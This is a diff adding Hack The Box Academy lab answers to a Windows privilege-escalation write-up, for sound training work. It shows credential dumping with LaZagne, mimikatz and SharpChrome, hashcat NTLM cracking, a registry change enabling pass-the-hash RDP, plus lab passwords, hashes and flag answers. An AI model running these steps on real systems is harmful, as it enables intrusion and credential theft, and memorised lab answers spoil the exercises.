@@ -1260,8 +1260,7 @@ xfreerdp /v:10.129.42.144 /u:bob /p:Str0ng3ncryptedP@ss! /cert:ignore
 Results: 3ncryt10n_w0nt_4llw@ys_s@v3_y0u
 
 
-
-
+**RDP to with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques shown in this section, find the cleartext password for the bob_adm user on the target system.**
 
 ```
 xfreerdp /v:10.129.42.144 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
@@ -1271,8 +1270,6 @@ dir 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_
 ```
 
 We will use the module [https://github.com/RamblingCookieMonster/PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite): 
-
-
 
 ```powershell-session
 Set-ExecutionPolicy Bypass -Scope Process
@@ -1301,3 +1298,379 @@ Text
 ```
 
 Results: 1qazXSW@3edc!
+
+
+
+**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.**
+
+```
+xfreerdp /v:10.129.23.186 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore
+
+```
+
+If we go to c:\Tools we can see that we have lazagne.exe at our disposal:
+
+```
+cd c:\Tools
+
+.\lazagne.exe databases
+```
+
+And the output:
+
+```
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+[+] System masterkey decrypted for c23eb53b-f1dd-47f6-b1e8-73e5446d9066
+[+] System masterkey decrypted for f7122927-87cd-41bc-b786-3f70200efc94
+[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
+[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6
+[+] System masterkey decrypted for 59cae5c6-be85-4073-9a6c-94889ba71196
+
+########## User: jordan ##########
+
+------------------- Dbvis passwords -----------------
+
+[+] Password found !!!
+Name: SQL01.inlanefreight.local
+Driver:
+          SQL Server (Microsoft JDBC Driver)
+
+Host: localhost
+Login: sa
+Password: S3cret_db_p@ssw0rd!
+Port: 1433
+
+
+[+] 1 passwords have been found.
+For more information launch it again with the -v option
+
+```
+
+Results: S3cret_db_p@ssw0rd!
+
+
+
+
+
+```
+------------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: transfer.inlanefreight.local
+Login: root
+Password: Summer2020!
+Port: 22
+
+```
+
+
+```
+whoami /priv
+```
+
+The user jordan has the SeDebugPrivilege enabled. `SeDebugPrivilege` allows you to interact with and inject into processes owned by other users, including SYSTEM. This privilege is often used for privilege escalation if you have the right tooling. And I do. We have mimikatz in C:\Tools
+
+```
+cd C:\Tools\Mimikatz\x64
+.\mimikatz.exe
+
+# Now in mimikatz:
+privilege::debug
+log creds.txt
+sekurlsa::logonpasswords
+
+```
+
+Output:
+```
+
+Authentication Id : 0 ; 1348983 (00000000:00149577)
+Session           : Interactive from 0
+User Name         : sccm_svc
+Domain            : WINLPE-SRV01
+Logon Server      : WINLPE-SRV01
+Logon Time        : 4/14/2025 11:16:12 AM
+SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
+        msv :
+         [00000006] Primary
+         * Username : sccm_svc
+         * Domain   : WINLPE-SRV01
+         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+        tspkg :
+        wdigest :
+         * Username : sccm_svc
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        kerberos :
+         * Username : sccm_svc
+         * Domain   : WINLPE-SRV01
+         * Password : (null)
+        ssp :
+```
+
+We can now use hashcat to extract the NTLM:
+
+```
+hashcat -m 1000 -a 0 64f12cddaa88057e06a81b54e73b949b  /usr/share/wordlists/rockyou.txt 
+```
+
+Now we have the user credentials:
+
+```
+sccm_svc:Password1
+```
+
+We can open a Powershell as that user and check our permissions with:
+
+```
+whoami /priv
+
+whoami /groups
+```
+
+I can see that I'm part of the Administrator group. However I'm not **a full Local Administrator**, even though it looks like I'm part  of the `Administrators` group — but crucially, that membership is marked as "Group used for deny only", which means -I'm running a standard user token, even if I'm technically a member of the `Administrators` group. This is typical in User Account Control (UAC) environments, where admin rights are only granted when explicitly elevated (e.g. via Run as Administrator). So let's elevate privileges with:
+
+```
+Start-Process powershell -Verb runAs
+```
+
+In cmd this would be:
+
+```
+runas /user:Administrator cmd
+```
+
+And now we can use again mimikatz to dump all passwords:
+
+```
+cd C:\Tools\Mimikatz\x64
+.\mimikatz.exe
+
+# Now in mimikatz:
+privilege::debug
+token::elevate
+lsadump::sam
+```
+
+And we will obtain:
+
+```
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000003e8 (1000)
+User : jordan
+  Hash NTLM: 30689ae6de22596f45afb9619f8e5fa0
+
+RID  : 000003e9 (1001)
+User : sarah
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+Welcome1 
+
+RID  : 000003ea (1002)
+User : helpdesk
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+Welcome1
+
+RID  : 000003eb (1003)
+User : secsvc
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+Welcome1
+
+RID  : 000003ec (1004)
+User : htb-student
+  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6
+
+RID  : 000003ed (1005)
+User : htb-student_adm
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+Welcome1
+
+
+RID  : 000003f1 (1009)
+User : sql_dev
+  Hash NTLM: c1b1a60715be1bb3f9e5a03092029c0b
+
+RID  : 000003f2 (1010)
+User : logger
+  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6
+
+RID  : 000003f4 (1012)
+User : sccm_svc
+  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
+Password1
+
+RID  : 000003f5 (1013)
+User : mrb3n
+  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
+
+```
+
+Now we can access as Administrator via RDP. For that, before closing the Administrator console we will modify the registry
+
+```
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+And now we can connect via RDP and the NTLM hash:
+
+```
+xfreerdp /v:10.129.23.186 /u:Administrator /pth:7796ee39fd3a9c3a1844556115ae1a54 /cert:ignore
+```
+
+
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Which user has credentials stored for RDP access to the WEB01 host?**
+
+```
+xfreerdp /v:10.129.170.75 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+Open powershell and go to c:\Tools
+
+```
+.\lazagne.exe all
+```
+
+Output:
+
+```
+########## User: htb-student ##########
+
+------------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: ftp.ilfreight.local
+Login: root
+Password: Ftpuser!
+Port: 22
+
+------------------- Vault passwords -----------------
+
+[-] Password not found !!!
+URL: Domain:target=WEB01
+Login: amanda
+
+
+[+] 1 passwords have been found.
+For more information launch it again with the -v option
+
+```
+
+**Results**: amanda
+
+
+**RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!".  Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login**
+
+```
+xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+Open Powershell and go to c:\Tools:
+
+```
+.\SharpChrome.exe logins /unprotect
+```
+
+Output:
+
+```
+[X] Error : 0
+
+---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---
+
+file_path,signon_realm,origin_url,date_created,times_used,username,password
+C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
+?"
+C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http://vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!
+```
+
+**Results**: ILVCadm1n1qazZAQ!
+
+
+
+ **RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!". Enumerate the host and find the password for ftp.ilfreight.local**
+
+```
+xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
+```
+
+Open powershell and go to c:\Tools
+
+```
+.\lazagne.exe all
+```
+
+Output:
+
+```
+########## User: htb-student ##########
+
+------------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: ftp.ilfreight.local
+Login: root
+Password: Ftpuser!
+Port: 22
+
+------------------- Vault passwords -----------------
+
+[-] Password not found !!!
+URL: Domain:target=WEB01
+Login: amanda
+
+
+[+] 1 passwords have been found.
+For more information launch it again with the -v option
+
+```
+
+**Results**: Ftpuser!
+
+Other creds in the system:
+
+```
+# Located at c:\Department Shares\IT\cred.txt
+NIX01 admin
+root:n1X_p0wer_us3er!
+
+# Located at c:\TakeOwn
+1m_th3_f1l3_0wn3r_n0W!
+
+# Running all modules of lazagne.exe with
+.\lazagne.exe all
+---------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: transfer.inlanefreight.local
+Login: root
+Password: Summer2020!
+Port: 22
+
+# Under C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
+F3ar_th3_p0tato!
+
+# By dumping files with password
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass"
+# We obtained: username="tomcat" password="s3cret"
+```
+
+## Restricted Environments
